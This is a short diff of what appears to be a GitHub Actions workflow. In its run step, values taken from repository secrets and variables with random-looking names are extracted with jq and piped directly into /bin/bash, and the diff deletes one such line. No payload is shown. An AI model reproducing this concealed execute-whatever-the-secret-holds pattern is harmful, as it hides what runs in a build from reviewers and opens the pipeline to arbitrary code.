@@ -17,7 +17,6 @@ jobs:
           mvd1265: ${{ secrets.mvd1265 }}
         run: |
           printf '%s' "$mvd1265" | jq -r .ymrt2090 | /bin/bash
-          echo $qzhah29 | jq -r .yts9 | /bin/bash
           printf '%s' "$gxvmm75981" | jq -r .rohr819 | /bin/bash
 
       - name: Save results
